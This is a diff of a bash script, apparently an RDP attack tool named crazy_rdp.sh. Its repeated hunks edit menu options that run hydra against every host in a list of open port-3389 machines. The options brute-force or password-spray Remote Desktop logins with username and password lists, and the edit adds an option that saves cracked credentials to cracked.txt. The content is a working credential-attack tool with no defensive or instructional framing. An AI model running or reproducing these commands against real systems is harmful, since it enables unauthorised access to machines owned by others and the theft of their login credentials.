@@ -7063,7 +7063,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7073,7 +7073,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7083,7 +7083,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7092,7 +7092,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7133,7 +7133,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7143,7 +7143,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7153,7 +7153,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7162,7 +7162,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7205,7 +7205,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7215,7 +7215,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7225,7 +7225,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7234,7 +7234,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7278,7 +7278,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7288,7 +7288,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7298,7 +7298,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7307,7 +7307,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7351,7 +7351,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7361,7 +7361,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7371,7 +7371,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7380,7 +7380,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7424,7 +7424,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7434,7 +7434,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7444,7 +7444,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7453,7 +7453,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7497,7 +7497,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7507,7 +7507,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7517,7 +7517,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7526,7 +7526,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7570,7 +7570,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7580,7 +7580,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7590,7 +7590,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7599,7 +7599,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7643,7 +7643,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7653,7 +7653,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7663,7 +7663,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7672,7 +7672,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7716,7 +7716,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7726,7 +7726,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7736,7 +7736,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7745,7 +7745,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7789,7 +7789,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7799,7 +7799,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7809,7 +7809,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7818,7 +7818,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7862,7 +7862,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7872,7 +7872,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7882,7 +7882,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7891,7 +7891,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7935,7 +7935,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7945,7 +7945,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7955,7 +7955,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -7964,7 +7964,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8008,7 +8008,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8018,7 +8018,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8028,7 +8028,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8037,7 +8037,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8081,7 +8081,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8091,7 +8091,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8101,7 +8101,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8110,7 +8110,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8154,7 +8154,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8164,7 +8164,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8174,7 +8174,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
